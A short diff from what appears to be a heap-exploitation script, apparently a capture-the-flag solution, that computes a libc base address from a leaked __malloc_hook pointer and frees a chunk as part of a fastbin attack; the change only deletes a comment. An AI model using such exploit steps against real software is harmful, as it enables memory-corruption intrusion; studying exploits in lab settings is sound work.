@@ -79,7 +79,6 @@ rename_a(4, l)
 libc_base = u64(l + "\x00" * 2) - libc.symbols['__malloc_hook'] - 0x68
 log.info("libc : " + hex(libc_base))
 
-# fastbin Attack
 # get the 0x280 byte chunk
 delete_a(5)
 
